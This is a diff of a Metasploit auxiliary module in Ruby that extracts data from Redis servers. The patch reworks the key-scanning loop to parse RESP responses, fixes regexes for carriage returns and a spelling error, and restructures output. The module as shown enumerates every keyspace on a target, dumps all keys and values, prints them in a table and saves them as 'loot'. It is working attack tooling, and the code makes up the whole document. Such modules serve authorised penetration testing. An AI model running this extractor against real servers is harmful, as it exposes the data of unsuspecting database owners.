@@ -22,17 +22,19 @@ class MetasploitModule < Msf::Auxiliary
   MIN_REDIS_VERSION = '2.8.0'
   @kv
 
+
+
   # Recurse to assemble the full list of keys
   def scan(offset)
-    response = redis_command('scan',offset).split("\n")
-    new_offset = response[2].strip # cursor position for next iteration or zero if we are done
-    key_offset=5 # location of first key in each response set.
-    while key_offset < response.length()
-      key = response[key_offset].strip
+    response = redis_command('scan',offset)
+    parsed = parse_redis_response(response)
+    raise "Unexpected RESP response length" unless parsed.length == 2
+    new_offset = parsed[0] # cursor position for next iteration or zero if we are done
+    keys = parsed[1]
+    keys.each do |key|
       @kv.push([key,value_for_key(key)])
-      key_offset += 2 # skip over byte count and only read data fields.
     end
-    scan(new_offset) unless new_offset.eql? "0"
+    new_offset
   end
 
   def value_for_key(key)
@@ -119,7 +121,8 @@ class MetasploitModule < Msf::Auxiliary
   def check_host(ip)
     info_data=redis_connect
     if(info_data)
-      if /os:(?<os_ver>.*)/ =~ info_data
+      if /os:(?<os_ver>.*)\r/ =~ info_data
+        os_ver = os_ver.strip
         print_status("OS is #{os_ver} ")
       end
 
@@ -127,7 +130,8 @@ class MetasploitModule < Msf::Auxiliary
         print_status("Redis reports #{keys} keys stored")
       end
 
-      if /used_memory_peak_human:(?<bytes>.*)/ =~ info_data
+      if /used_memory_peak_human:(?<bytes>.*)\r/ =~ info_data
+        bytes = bytes.strip
         print_status("#{bytes.chomp} bytes stored")
       end
     end
@@ -137,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_keyspace
     ks = redis_command('INFO','keyspace')
-    ks = ks.split("\n")[2..-1]
+    ks = ks.split("\r\n")[2..-1]
     result = []
     ks.each do |k|
       if /db(?<db>\S+):/ =~ k && /keys=(?<keys>\S+),expires/ =~ k
@@ -155,31 +159,35 @@ class MetasploitModule < Msf::Auxiliary
 
     keyspace = get_keyspace
     keyspace.each do |space|
-      print_status("Extracting about #{space[1]} keys from databaase #{space[0]}")
+      print_status("Extracting about #{space[1]} keys from database #{space[0]}")
       redis_command('SELECT',space[0])
       @kv=[]
-      scan("0")
+      new_offset = "0"
+      loop do
+        new_offset = scan(new_offset)
+        break if new_offset == "0"
+      end
 
       if(@kv.length == 0)
         print_status("No keys returned")
-      else
-
-        # Report data in terminal
-        result_table = Rex::Text::Table.new(
-          'Header'  => "Data from #{peer} database #{space[0]}",
-          'Indent'  => 1,
-          'Columns' => [ 'Key', 'Value' ]
-        )
-        @kv.each { |pair| result_table << pair }
-        print_line
-        print_line("#{result_table}")
-
-        # Store data as loot
-        csv=[]
-        @kv.each { |pair| csv << pair.to_csv }
-        path = store_loot("redis.dump_db#{space[0]}", 'text/plain', rhost,csv.join, 'redis.txt', 'Redis extractor')
-        print_good("Redis data stored at #{path}")
+        next
       end
+
+      # Report data in terminal
+      result_table = Rex::Text::Table.new(
+        'Header'  => "Data from #{peer} database #{space[0]}",
+        'Indent'  => 1,
+        'Columns' => [ 'Key', 'Value' ]
+      )
+      @kv.each { |pair| result_table << pair }
+      print_line
+      print_line("#{result_table}")
+
+      # Store data as loot
+      csv=[]
+      @kv.each { |pair| csv << pair.to_csv }
+      path = store_loot("redis.dump_db#{space[0]}", 'text/plain', rhost,csv.join, 'redis.txt', 'Redis extractor')
+      print_good("Redis data stored at #{path}")
     end
     disconnect
   end
